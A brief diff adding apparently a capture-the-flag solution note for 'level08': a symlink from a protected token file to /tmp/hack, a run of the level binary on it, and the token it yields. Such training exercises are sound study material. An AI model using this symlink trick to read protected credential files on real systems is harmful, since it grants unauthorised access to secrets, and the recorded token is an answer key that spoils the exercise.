@@ -1,0 +1,4 @@
+ln -s /home/user/level08/token /tmp/hack
+./level08 /tmp/hack
+
+gives quif5eloekouj29ke0vouxean
